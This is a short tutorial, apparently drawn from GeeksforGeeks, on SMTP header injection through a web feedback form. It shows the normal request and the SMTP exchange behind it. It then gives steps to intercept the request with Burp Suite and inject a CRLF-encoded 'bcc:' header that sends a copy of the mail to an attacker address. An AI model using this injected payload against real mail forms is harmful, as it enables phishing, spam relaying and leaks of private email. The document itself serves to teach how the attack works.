
SMTP header injection is a technique that is used by attacker to exploit the mail and web servers of the application when the input is not sanitized carefully, it allows the attacker to send emails to other user, the attacker may attach phishing emails, or any dangerous script.  As emails sometimes contains private information that can be a disaster for a company if an unauthorized person can read that information.

For example: An application that uses requests of the following form to submit feedback:
```
POST feedback.php HTTP/1.1
Host: geeksforgeeks.com
Content-Length: 56
From=username@gmail.com&Subject=Site+feedback&Message
=love+geeksforgeeks
```

After submitting the input, the web application to perform an SMTP procedure by using following commands:
```
MAIL FROM:username@gmail.com
RCPT TO:feedback@geeksforgeeks.com
DATA
From: username@gmail.com
To:feedback@geeksforgeeks.com
Subject:Site feedback
love geeksforgeeks
.
```

**NOTE:** The “.” after the message is the end of that particular message.

- **MAIL FROM:** It used to set the sender.
- **RCPT TO:** This command is containing all the recipient email addresses.
- **DATA:** This contains the email data.

### **Exploiting The STMP Header to Perform SMTP Header Injection:**

- **Step 1:** Fill the details in the feedback form as show in above example of SMTP.
- **Step 2:** Intercept the request that you made by any intercepting tool like Burp Suite.
- **Step 3:**  Inject the malicious input in that capture request.

**Example**:      
```
POST feedback.php HTTP/1.1
Host: geeksforgeeks.com
Content-Length: 56
From=username@gmail.com%0d%0a 
bcc:attackername%40attacker.com&Subject=Site+feedback&Message
=love+geeksforgeeks 
```

**Note:** “%0a” used for a new line, it is an encoded form of “\n”.

- **Step 4**: Now send the injected request as shown in above box.


Thanks to: geeksforgeeks.org